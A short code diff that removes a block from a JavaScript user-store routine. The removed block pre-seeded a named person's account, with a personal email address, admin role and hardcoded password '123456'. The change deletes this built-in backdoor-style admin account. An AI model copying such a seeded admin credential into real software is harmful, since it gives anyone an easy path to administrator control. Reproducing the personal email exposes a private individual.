@@ -79,23 +79,6 @@ function writeUsers(users) {
     modified = true;
   }
 
-  // Pre-seed Prashant Kumar account if requested
-  const prashantUser = users.find(u => u.email === "prashantk6515@gmail.com");
-  if (!prashantUser) {
-    const salt = bcrypt.genSaltSync(10);
-    users.push({
-      id: "usr_prashant_01",
-      name: "Prashant Kumar",
-      email: "prashantk6515@gmail.com",
-      passwordHash: bcrypt.hashSync("123456", salt),
-      role: "admin", // Granted admin permissions
-      isVerified: true,
-      createdAt: new Date().toISOString(),
-      updatedAt: new Date().toISOString()
-    });
-    modified = true;
-  }
-
   if (modified) {
     writeUsers(users);
   }
